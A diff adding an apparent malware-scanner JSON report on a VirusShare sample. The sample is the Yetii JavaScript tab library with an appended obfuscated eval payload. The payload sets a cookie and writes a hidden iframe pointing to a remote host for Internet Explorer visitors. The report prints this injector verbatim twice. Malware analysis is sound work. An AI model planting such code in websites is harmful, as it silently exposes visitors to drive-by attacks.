@@ -1,0 +1,93 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "write": "May write to a file"
+        },
+        "macro": "/*\nYetii - Yet (E)Another Tab Interface Implementation\nhttp://www.kminek.pl/lab/yetii/\nCopyright (c) 2007 Grzegorz Wojcik\nCode licensed under the BSD License:\nhttp://www.kminek.pl/bsdlicense.txt\n*/\n\nfunction Yetii() {\n\n\tthis.defaults = {\n\t\t\n\t\tid: null,\n\t\tactive: 1,\n\t\ttimeout: null,\n\t\tinterval: null,\n\t\ttabclass: 'tab',\n\t\tactiveclass: 'active'\n\t\n\t};\n\t\n\tfor (var n in arguments[0]) { this.defaults[n]=arguments[0][n]; };\t\n\t\n\tthis.getTabs = function() {\n        \n\t\t\n        var retnode = [];\n        var elem = document.getElementById(this.defaults.id).getElementsByTagName('*');\n\t\t\n\t\tvar regexp = new RegExp(\"(^|\\\\s)\" + this.defaults.tabclass.replace(/\\-/g, \"\\\\-\") + \"(\\\\s|$)\");\n\t\n        for (var i = 0; i < elem.length; i++) {\n        if (regexp.test(elem[i].className)) retnode.push(elem[i]);\n        }\n    \n        return retnode;\n    \n    };\n\t\n\tthis.links = document.getElementById(this.defaults.id + '-nav').getElementsByTagName('a');\n\t\n\tthis.show = function(number){\n        \n        for (var i = 0; i < this.tabs.length; i++) {\n        this.tabs[i].style.display = ((i+1)==number) ? 'block' : 'none';\n        this.links[i].className = ((i+1)==number) ? this.defaults.activeclass : '';\n        }\n    \n    };\n\t\n\t this.rotate = function(interval){\n    \n        this.show(this.defaults.active);\n        this.defaults.active++;\n    \n        if(this.defaults.active > this.tabs.length) this.defaults.active = 1;\n    \n        var self = this;\n        this.defaults.timeout = setTimeout(function(){self.rotate(interval);}, interval*1000);\n    \n    };\n\t\n\tthis.tabs = this.getTabs();\n\tthis.show(this.defaults.active);\n\t\n\tvar self = this;\n\tfor (var i = 0; i < this.links.length; i++) {\n\tthis.links[i].customindex = i+1;\n\tthis.links[i].onclick = function(){ if (self.defaults.timeout) clearTimeout(self.defaults.timeout); self.show(this.customindex); return false; };\n    }\n\t\n\tif (this.defaults.interval) this.rotate(this.defaults.interval);\n\t\n};\nsa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
+    },
+    "filename": "VirusShare_15ec480bad3fb6fb19d62b63ea2e324b",
+    "filesize": 2402,
+    "filetype": "ASCII text, with very long lines",
+    "hashes": {
+        "md5": "15ec480bad3fb6fb19d62b63ea2e324b",
+        "sha1": "bef4a4276bcc7f107077fceee9ffcec572c98bef",
+        "sha256": "925b5b3a07795dae044a3e6be0c6d5f6d7cbe39d0843d8bd923ce65fd6864755"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Yetii - Yet (E)Another Tab Interface Implementation",
+            "http://www.kminek.pl/lab/yetii/",
+            "Copyright (c) 2007 Grzegorz Wojcik",
+            "Code licensed under the BSD License:",
+            "http://www.kminek.pl/bsdlicense.txt",
+            "function Yetii() {",
+            "\tthis.defaults = {",
+            "\t\tid: null,",
+            "\t\tactive: 1,",
+            "\t\ttimeout: null,",
+            "\t\tinterval: null,",
+            "\t\ttabclass: 'tab',",
+            "\t\tactiveclass: 'active'",
+            "\tfor (var n in arguments[0]) { this.defaults[n]=arguments[0][n]; };\t",
+            "\tthis.getTabs = function() {",
+            "        ",
+            "        var retnode = [];",
+            "        var elem = document.getElementById(this.defaults.id).getElementsByTagName('*');",
+            "\t\tvar regexp = new RegExp(\"(^|\\\\s)\" + this.defaults.tabclass.replace(/\\-/g, \"\\\\-\") + \"(\\\\s|$)\");",
+            "        for (var i = 0; i < elem.length; i++) {",
+            "        if (regexp.test(elem[i].className)) retnode.push(elem[i]);",
+            "        }",
+            "    ",
+            "        return retnode;",
+            "    ",
+            "    };",
+            "\tthis.links = document.getElementById(this.defaults.id + '-nav').getElementsByTagName('a');",
+            "\tthis.show = function(number){",
+            "        ",
+            "        for (var i = 0; i < this.tabs.length; i++) {",
+            "        this.tabs[i].style.display = ((i+1)==number) ? 'block' : 'none';",
+            "        this.links[i].className = ((i+1)==number) ? this.defaults.activeclass : '';",
+            "        }",
+            "    ",
+            "    };",
+            "\t this.rotate = function(interval){",
+            "    ",
+            "        this.show(this.defaults.active);",
+            "        this.defaults.active++;",
+            "    ",
+            "        if(this.defaults.active > this.tabs.length) this.defaults.active = 1;",
+            "    ",
+            "        var self = this;",
+            "        this.defaults.timeout = setTimeout(function(){self.rotate(interval);}, interval*1000);",
+            "    ",
+            "    };",
+            "\tthis.tabs = this.getTabs();",
+            "\tthis.show(this.defaults.active);",
+            "\tvar self = this;",
+            "\tfor (var i = 0; i < this.links.length; i++) {",
+            "\tthis.links[i].customindex = i+1;",
+            "\tthis.links[i].onclick = function(){ if (self.defaults.timeout) clearTimeout(self.defaults.timeout); self.show(this.customindex); return false; };",
+            "    }",
+            "\tif (this.defaults.interval) this.rotate(this.defaults.interval);",
+            "sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
+        ],
+        "file": {
+            "http://www.kminek.pl/bsdlicense.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.kminek.pl/lab/yetii/",
+            "http://www.kminek.pl/bsdlicense.txt"
+        ]
+    },
+    "time": "0:00:00.300654",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
